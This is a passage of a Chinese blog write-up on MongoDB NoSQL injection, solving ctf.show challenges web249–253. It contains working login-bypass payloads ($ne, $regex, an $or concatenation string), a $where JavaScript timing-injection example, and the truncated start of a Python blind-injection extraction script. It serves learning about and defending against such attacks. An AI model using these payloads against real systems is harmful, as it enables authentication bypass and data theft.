style=\"text-align:left\">table joins</td>\n<td style=\"text-align:left\"></td>\n<td style=\"text-align:left\">表连接，MongoDB 不支持</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">primary key</td>\n<td style=\"text-align:left\">primary key</td>\n<td style=\"text-align:left\">主键，MongoDB 自动将_id 字段设置为主键</td>\n</tr>\n</tbody>\n</table>\n<p>下面是条件操纵符的整理</p>\n<figure class=\"highlight perl\"><figcaption data-lang=\"perl\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$gt</span> <span class=\"token punctuation\">:</span> <span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$lt</span> <span class=\"token punctuation\">:</span> <span class=\"token operator\">&lt;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token variable\">$gte</span><span class=\"token punctuation\">:</span> <span class=\"token operator\">>=</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token variable\">$lte</span><span class=\"token punctuation\">:</span> <span class=\"token operator\">&lt;=</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token variable\">$ne</span> <span class=\"token punctuation\">:</span> <span class=\"token operator\">!=</span>、<span class=\"token filehandle symbol\">&lt;></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token variable\">$in</span> <span class=\"token punctuation\">:</span> in</pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token variable\">$nin</span><span class=\"token punctuation\">:</span> <span class=\"token operator\">not</span> in</pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token variable\">$all</span><span class=\"token punctuation\">:</span> all </pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token variable\">$or</span><span class=\"token punctuation\">:</span><span class=\"token operator\">or</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token variable\">$not</span><span class=\"token punctuation\">:</span> 反匹配<span class=\"token punctuation\">(</span><span class=\"token v-string string\">1.3.3</span>及以上版本<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>模糊查询用正则式：db<span class=\"token operator\">.</span>customer<span class=\"token operator\">.</span>find<span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">'name'</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">&#123;</span><span class=\"token string\">'$regex'</span><span class=\"token punctuation\">:</span><span class=\"token string\">'.*s.*'</span><span class=\"token punctuation\">&#125;</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token operator\">/</span><span class=\"token operator\">**</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token operator\">*</span> <span class=\"token punctuation\">:</span> 范围查询 <span class=\"token punctuation\">&#123;</span> <span class=\"token string\">\"age\"</span> <span class=\"token punctuation\">:</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token string\">\"$gte\"</span> <span class=\"token punctuation\">:</span> <span class=\"token number\">2</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">\"$lte\"</span> <span class=\"token punctuation\">:</span> <span class=\"token number\">21</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token operator\">*</span> <span class=\"token punctuation\">:</span> <span class=\"token variable\">$ne</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token string\">\"age\"</span> <span class=\"token punctuation\">:</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token string\">\"$ne\"</span> <span class=\"token punctuation\">:</span> <span class=\"token number\">23</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token operator\">*</span> <span class=\"token punctuation\">:</span> <span class=\"token variable\">$lt</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token string\">\"age\"</span> <span class=\"token punctuation\">:</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token string\">\"$lt\"</span> <span class=\"token punctuation\">:</span> <span class=\"token number\">23</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token operator\">*</span><span class=\"token operator\">/</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>例：</pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token operator\">//</span>查询age <span class=\"token operator\">=</span> <span class=\"token number\">22</span>的记录</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>db<span class=\"token operator\">.</span>userInfo<span class=\"token operator\">.</span>find<span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"age\"</span><span class=\"token punctuation\">:</span> <span class=\"token number\">22</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token operator\">//</span>相当于：select <span class=\"token operator\">*</span> from userInfo where age <span class=\"token operator\">=</span> <span class=\"token number\">22</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token operator\">//</span>查询age <span class=\"token operator\">></span> <span class=\"token number\">22</span>的记录</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>db<span class=\"token operator\">.</span>userInfo<span class=\"token operator\">.</span>find<span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span>age<span class=\"token punctuation\">:</span> <span class=\"token punctuation\">&#123;</span><span class=\"token variable\">$gt</span><span class=\"token punctuation\">:</span> <span class=\"token number\">22</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token operator\">//</span>相当于：select <span class=\"token operator\">*</span> from userInfo where age <span class=\"token operator\">></span> <span class=\"token number\">22</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>MongoDB 之类的流行数据存储中，JSON 查询结构。</p>\n<p>下表列出了 RDBMS 与 MongoDB 对应的术语：</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">RDBMS</th>\n<th style=\"text-align:left\">MongoDB</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">数据库</td>\n<td style=\"text-align:left\">数据库</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">表</td>\n<td style=\"text-align:left\">集合</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">行</td>\n<td style=\"text-align:left\">文档</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">列</td>\n<td style=\"text-align:left\">字段</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">表联合</td>\n<td style=\"text-align:left\">嵌入文档</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">主键</td>\n<td style=\"text-align:left\">主键 (MongoDB 提供了 key 为 _id)</td>\n</tr>\n</tbody>\n</table>\n<p>MongoDB 中可以使用的类型如下表所示：</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\"><strong>类型</strong></th>\n<th style=\"text-align:left\"><strong>数字</strong></th>\n<th style=\"text-align:left\"><strong>备注</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\">Double</td>\n<td style=\"text-align:left\">1</td>\n<td style=\"text-align:left\"></td>\n</tr>\n<tr>\n<td style=\"text-align:left\">String</td>\n<td style=\"text-align:left\">2</td>\n<td style=\"text-align:left\"></td>\n</tr>\n<tr>\n<td style=\"text-align:left\">Object</td>\n<td style=\"text-align:left\">3</td>\n<td style=\"text-align:left\"></td>\n</tr>\n<tr>\n<td style=\"text-align:left\">Array</td>\n<td style=\"text-align:left\">4</td>\n<td style=\"text-align:left\"></td>\n</tr>\n<tr>\n<td style=\"text-align:left\">Binary data</td>\n<td style=\"text-align:left\">5</td>\n<td style=\"text-align:left\"></td>\n</tr>\n<tr>\n<td style=\"text-align:left\">Undefined</td>\n<td style=\"text-align:left\">6</td>\n<td style=\"text-align:left\">已废弃。</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">Object id</td>\n<td style=\"text-align:left\">7</td>\n<td style=\"text-align:left\"></td>\n</tr>\n<tr>\n<td style=\"text-align:left\">Boolean</td>\n<td style=\"text-align:left\">8</td>\n<td style=\"text-align:left\"></td>\n</tr>\n<tr>\n<td style=\"text-align:left\">Date</td>\n<td style=\"text-align:left\">9</td>\n<td style=\"text-align:left\"></td>\n</tr>\n<tr>\n<td style=\"text-align:left\">Null</td>\n<td style=\"text-align:left\">10</td>\n<td style=\"text-align:left\"></td>\n</tr>\n<tr>\n<td style=\"text-align:left\">Regular Expression</td>\n<td style=\"text-align:left\">11</td>\n<td style=\"text-align:left\"></td>\n</tr>\n<tr>\n<td style=\"text-align:left\">JavaScript</td>\n<td style=\"text-align:left\">13</td>\n<td style=\"text-align:left\"></td>\n</tr>\n<tr>\n<td style=\"text-align:left\">Symbol</td>\n<td style=\"text-align:left\">14</td>\n<td style=\"text-align:left\"></td>\n</tr>\n<tr>\n<td style=\"text-align:left\">JavaScript (with scope)</td>\n<td style=\"text-align:left\">15</td>\n<td style=\"text-align:left\"></td>\n</tr>\n<tr>\n<td style=\"text-align:left\">32-bit integer</td>\n<td style=\"text-align:left\">16</td>\n<td style=\"text-align:left\"></td>\n</tr>\n<tr>\n<td style=\"text-align:left\">Timestamp</td>\n<td style=\"text-align:left\">17</td>\n<td style=\"text-align:left\"></td>\n</tr>\n<tr>\n<td style=\"text-align:left\">64-bit integer</td>\n<td style=\"text-align:left\">18</td>\n<td style=\"text-align:left\"></td>\n</tr>\n<tr>\n<td style=\"text-align:left\">Min key</td>\n<td style=\"text-align:left\">255</td>\n<td style=\"text-align:left\">Query with  <code>-1</code> .</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">Max key</td>\n<td style=\"text-align:left\">127</td>\n<td style=\"text-align:left\"></td>\n</tr>\n</tbody>\n</table>\n<p>有关 mongodb 更多语法还请移步菜鸟教程</p>\n<h2 id=\"nosql注入分类\"><a class=\"anchor\" href=\"#nosql注入分类\">#</a> nosql 注入分类</h2>\n<p>这里我在各个博客中找到了两种对 nosql 注入的分类</p>\n<ul>\n<li>\n<p>第一种，按照攻击手法分类</p>\n<ol>\n<li>\n<p>重言式</p>\n<ol>\n<li>也称为 “永真式”，这类攻击是在条件语句中注入代码使得生成的结果为永真，绕过判断机制</li>\n</ol>\n</li>\n<li>\n<p>联合查询</p>\n<p>一样和传统数据库常用的 sql 注入的方法</p>\n</li>\n<li>\n<p>javaScript 注入</p>\n<ol>\n<li>这种漏洞是由于允许执行数据内容的 Nosql 数据库引入的，构造攻击语句通过 js 输入到查询中，从而导致数据被非法获取或者篡改</li>\n</ol>\n</li>\n<li>\n<p>盲注</p>\n<ol>\n<li>没有回显时使用的一种注入方式</li>\n</ol>\n</li>\n<li>\n<p>背负式查询</p>\n<ol>\n<li>通过转义字符插入数据库进行额外的查询，进而执行任意代码</li>\n</ol>\n</li>\n<li>\n<p>跨域违规</p>\n<ol>\n<li>这里产生漏洞的是 HTTP REST APls（一个实现对数据库进行访问和管理的接口协议）它甚至可以让攻击者从其他域攻击数据库。在跨域工具中，攻击者利用合法用户和他们的网页浏览器执行有害操作</li>\n</ol>\n</li>\n</ol>\n</li>\n<li>\n<p>第二种，按照语言的分类</p>\n<ol>\n<li>php 数组注入</li>\n<li>js 注入</li>\n<li>monggoshell 拼接注入</li>\n</ol>\n</li>\n</ul>\n<p>这里主要记录第一种分类的学习</p>\n<h2 id=\"重言式\"><a class=\"anchor\" href=\"#重言式\">#</a> 重言式</h2>\n<h3 id=\"web249\"><a class=\"anchor\" href=\"#web249\">#</a> web249</h3>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230301133004913.png\" alt=\"image-20230301133004913\" /></p>\n<p>这里提示了 flag 在 flag 里，id 这里对输入进行了校验<br />\n y4 师傅说这题后端对 id 过滤了非数字，可能用的 intval 函数。这里使用数组绕过即可</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230301133158297.png\" alt=\"image-20230301133158297\" /></p>\n<p>这个感觉不算是考察 nosql？？</p>\n<h3 id=\"web250\"><a class=\"anchor\" href=\"#web250\">#</a> web250</h3>\n<p>这个题利用 nosql 的一个小特性即可</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230301133529499.png\" alt=\"image-20230301133529499\" /></p>\n<p>这里有提示说没有任何过滤，利用 $ne 就可以了</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230301135349643.png\" alt=\"image-20230301135349643\" /></p>\n<p>在上面有提到过这个 $ne 在 nosql 中就是不等于，这里传入的 username 和 password 就是传入的数据，他判断用户名和密码是否正确，这里通过使用 $ne 构造永真绕过判断，类似 sql 注入里的 or 1=1, 这就是上面提到的重言式注入</p>\n<h3 id=\"web251\"><a class=\"anchor\" href=\"#web251\">#</a> web251</h3>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230301135843329.png\" alt=\"image-20230301135843329\" /></p>\n<p>这里发现好像没改什么，也提示说无过滤，还是先用上面的 payload 尝试</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230301140017356.png\" alt=\"image-20230301140017356\" /></p>\n<p>也利用成功了，但是这里是给了账号密码，尝试登录也没什么新的东西，想到这里可能是只查询一条数据，这里使得 username 为 flag 可以找到 flag</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230301140301944.png\" alt=\"image-20230301140301944\" /></p>\n<p>看到师傅们还可以使用正则</p>\n<pre><code>username[$regex]=.*&amp;password[$regex]=.*\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230301140533852.png\" alt=\"image-20230301140533852\" /></p>\n<h3 id=\"web252\"><a class=\"anchor\" href=\"#web252\">#</a> web252</h3>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230301163101109.png\" alt=\"image-20230301163101109\" /></p>\n<p>这一题有点变化，但是没啥影响，这个 pretty () 方法的作用是使得查询出来的数据在命令行中更加美观的显示，不至于太紧凑。</p>\n<p>用前面的永真测试</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230301163248398.png\" alt=\"image-20230301163248398\" /></p>\n<p>和上面一样，第一条没有 flag 尝试直接读 flag</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230301163351837.png\" alt=\"image-20230301163351837\" /></p>\n<p>也是失败的，尝试跳过 admin，但是还有 admin1</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230301163457769.png\" alt=\"image-20230301163457769\" /></p>\n<p>这里要用到前面的正则</p>\n<pre><code>username[$regex]=^[^a].*$&amp;password[$ne]=1\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230301163637992.png\" alt=\"image-20230301163637992\" /></p>\n<h2 id=\"联合查询\"><a class=\"anchor\" href=\"#联合查询\">#</a> 联合查询</h2>\n<p>前面有提到，mongodb 使用的是 json 的查询结构，json 对字符串的拼接也有着类似传统 sql 注入的地方</p>\n<p>例：</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>string query <span class=\"token operator\">=</span><span class=\"token string\">\"&#123; username: '\"</span> <span class=\"token operator\">+</span> $username <span class=\"token operator\">+</span> <span class=\"token string\">\"', password: '\"</span> <span class=\"token operator\">+</span> $password <span class=\"token operator\">+</span> <span class=\"token string\">\"' &#125;\"</span></pre></td></tr></table></figure><p>当用户输入用户名和密码后，这里如果对用户输入的校验不足</p>\n<figure class=\"highlight json\"><figcaption data-lang=\"JSON\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token punctuation\">&#123;</span>'username'<span class=\"token operator\">:</span>'admin'<span class=\"token punctuation\">,</span> 'password'<span class=\"token operator\">:</span>'<span class=\"token number\">123456</span>'<span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>就可以构造 payload：</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>username<span class=\"token operator\">=</span>admin<span class=\"token string\">', $or: [ &#123;&#125;, &#123;'</span>a<span class=\"token string\">': '</span>a<span class=\"token operator\">&amp;</span>password<span class=\"token operator\">=</span><span class=\"token string\">' &#125;], $comment: '</span><span class=\"token number\">123456</span></pre></td></tr></table></figure><p>拼接后相当于是执行了</p>\n<figure class=\"highlight json\"><figcaption data-lang=\"JSON\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token punctuation\">&#123;</span> username<span class=\"token operator\">:</span> 'admin'<span class=\"token punctuation\">,</span> $or<span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">&#123;</span>'a'<span class=\"token operator\">:</span>'a'<span class=\"token punctuation\">,</span> password<span class=\"token operator\">:</span> '' <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> $comment<span class=\"token operator\">:</span> '<span class=\"token number\">123456</span>'<span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>这个就类似</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> logins <span class=\"token keyword\">where</span> username <span class=\"token operator\">=</span> <span class=\"token string\">'admin'</span> <span class=\"token operator\">and</span> <span class=\"token punctuation\">(</span>password <span class=\"token boolean\">true</span><span class=\"token operator\">&lt;></span> <span class=\"token operator\">or</span> <span class=\"token punctuation\">(</span><span class=\"token string\">'a'</span><span class=\"token operator\">=</span><span class=\"token string\">'a'</span> <span class=\"token operator\">and</span> password <span class=\"token operator\">=</span> <span class=\"token string\">''</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"js注入\"><a class=\"anchor\" href=\"#js注入\">#</a> js 注入</h2>\n<p>攻击者通过构造恶意的查询语句，利用 NoSQL 数据库的查询语句中可执行 JavaScript 代码的特性，来获取敏感信息或实现远程执行等攻击</p>\n<p>在 NoSQL 数据库中，由于查询语句中允许执行 JavaScript 代码，因此攻击者可以在查询语句中注入恶意的 JavaScript 代码，从而获取敏感信息。例如，攻击者可以通过构造恶意的查询语句来绕过登录验证，获取管理员权限。同时，攻击者还可以利用查询语句中执行 JavaScript 代码的特性来实现远程执行攻击，例如在服务器上执行任意的系统命令，导致服务器被入侵控制等。</p>\n<h3 id=\"where操作符\"><a class=\"anchor\" href=\"#where操作符\">#</a> $where 操作符</h3>\n<p>$where 操作符是 MongoDB 中的一种查询语句，可以用于执行自定义的 JavaScript 表达式，并返回符合条件的文档。</p>\n<p>在 MongoDB 中，可以使用 $where 操作符在集合中进行查询，示例代码如下：</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>db<span class=\"token punctuation\">.</span>collection<span class=\"token punctuation\">.</span>find<span class=\"token punctuation\">(</span> &#123; $<span class=\"token keyword\">where</span>: <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> &#123; <span class=\"token keyword\">return</span> this<span class=\"token punctuation\">.</span>field1 <span class=\"token operator\">=</span><span class=\"token operator\">=</span> this<span class=\"token punctuation\">.</span>field2<span class=\"token punctuation\">;</span> &#125; &#125; <span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>在这个例子中，$where 操作符的参数是一个 JavaScript 函数，函数体内使用了 MongoDB 的 JavaScript Shell 中的 this 变量，指代了当前文档对象。函数体中的表达式用于检查文档中的某些字段是否相等，如果相等，则返回该文档。</p>\n<p>需要注意的是，使用 $where 操作符需要在查询中执行 JavaScript 代码，因此性能可能会较差，不建议在大数据量的环境中使用。此外，由于 JavaScript 语言的灵活性，$where 查询可能存在安全风险，攻击者可以通过构造恶意代码实现注入攻击，因此需要谨慎使用。</p>\n<p>通常情况下，应该优先选择 MongoDB 提供的其他查询语句，比如 $eq、$ne、$in 等操作符，这些操作符可以更高效地执行查询，并且不会引入安全风险。只有在特定的场景下，才需要使用 $where 操作符进行高度定制化的查询。</p>\n<p>如下实例：</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">></span> db<span class=\"token punctuation\">.</span>users<span class=\"token punctuation\">.</span>find<span class=\"token punctuation\">(</span>&#123; $<span class=\"token keyword\">where</span>: <span class=\"token string\">\"function()&#123;return(this.username == 'whoami')&#125;\"</span> &#125;<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>&#123; <span class=\"token string\">\"_id\"</span> : ObjectId<span class=\"token punctuation\">(</span><span class=\"token string\">\"60fa9c80257f18542b68c4b9\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"username\"</span> : <span class=\"token string\">\"whoami\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"password\"</span> : <span class=\"token string\">\"657260\"</span> &#125;</pre></td></tr></table></figure><p>由于使用了  <code>$where</code>  关键字，其后面的 JavaScript 将会被执行并返回 &quot;whoami&quot;，然后将查询出 username 为 whoami 的数据。</p>\n<p>某些易受攻击的 PHP 应用程序在构建 MongoDB 查询时可能会直接插入未经过处理的用户输入，例如从变量中  <code>$userData</code>  获取查询条件：</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>db<span class=\"token punctuation\">.</span>users<span class=\"token punctuation\">.</span>find<span class=\"token punctuation\">(</span>&#123; $<span class=\"token keyword\">where</span>: <span class=\"token string\">\"function()&#123;return(this.username == $userData)&#125;\"</span> &#125;<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>然后，攻击者可能会注入一种恶意的字符串如  <code>'a'; sleep(5000)</code>  ，此时 MongoDB 执行的查询语句为：</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>db<span class=\"token punctuation\">.</span>users<span class=\"token punctuation\">.</span>find<span class=\"token punctuation\">(</span>&#123; $<span class=\"token keyword\">where</span>: <span class=\"token string\">\"function()&#123;return(this.username == 'a'; sleep(5000))&#125;\"</span> &#125;<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>如果此时服务器有 5 秒钟的延迟则说明注入成功。</p>\n<p>以下是一个简单的示例，假设一个应用使用 MongoDB 作为数据库，有一个用户登录的验证过程：</p>\n<figure class=\"highlight js\"><figcaption data-lang=\"JavaScript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">var</span> username <span class=\"token operator\">=</span> req<span class=\"token punctuation\">.</span>body<span class=\"token punctuation\">.</span>username<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">var</span> password <span class=\"token operator\">=</span> req<span class=\"token punctuation\">.</span>body<span class=\"token punctuation\">.</span>password<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">var</span> query <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token literal-property property\">username</span><span class=\"token operator\">:</span> username<span class=\"token punctuation\">,</span> <span class=\"token literal-property property\">password</span><span class=\"token operator\">:</span> password <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>db<span class=\"token punctuation\">.</span>users<span class=\"token punctuation\">.</span><span class=\"token function\">find</span><span class=\"token punctuation\">(</span>query<span class=\"token punctuation\">,</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">err<span class=\"token punctuation\">,</span> result</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>err<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throw</span> err<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">.</span>length <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    res<span class=\"token punctuation\">.</span><span class=\"token function\">send</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Login success'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    res<span class=\"token punctuation\">.</span><span class=\"token function\">send</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Login failed'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>在这个过程中，黑客可以通过构造特定的 JavaScript 代码来注入恶意脚本，例如将 password 参数设置为以下内容：</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>&#123; $ne: <span class=\"token string\">'1'</span> &#125;</pre></td></tr></table></figure><p>这个语句会使得 MongoDB 查询语句的结果永远为真，从而可以成功绕过登录验证。</p>\n<h2 id=\"盲注\"><a class=\"anchor\" href=\"#盲注\">#</a> 盲注</h2>\n<h3 id=\"web253\"><a class=\"anchor\" href=\"#web253\">#</a> web253</h3>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230301163922915.png\" alt=\"image-20230301163922915\" /></p>\n<p>还是没啥改变，继续用前面的测试</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230301163959772.png\" alt=\"image-20230301163959772\" /></p>\n<p>这里测试发现登录成功，但是没有回显了，那肯定就是盲注咯</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/env python</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\"># -*- coding: utf-8 -*-</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># author： Clown</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\"># datetime： 2023/3/1 16:49 </span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\"># ide： PyCharm</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">import</span> requests</pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>url <span class=\"token operator\">=</span> <span class=\"token string\">\"http://65083bf6-7c9c-4c55-ba15-aa555b4df664.challenge.ctf.show/api/\"</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>proxies<span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">'http'</span><span class=\"token punctuation\">:</span><span class=\"token string\">'http://127.0.0.1:8080'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'https'</span><span class=\"token punctuation\">:</span><span class=\"token string\">'https://127.0.0.1:8080'</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>headers <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token string\">\"Content-Type\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"application/x-www-form-urlencoded\"</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>flag<span class=\"token operator\">=</span><span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">for</span> ch <span class=\"token keyword\">in</span> <span class=\"token string\">\"&#123;-abcdefghijklmnopqrstuvwxyz0123456789&#125;\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        payload <span class=\"token operator\">=</span> <span class=\"token 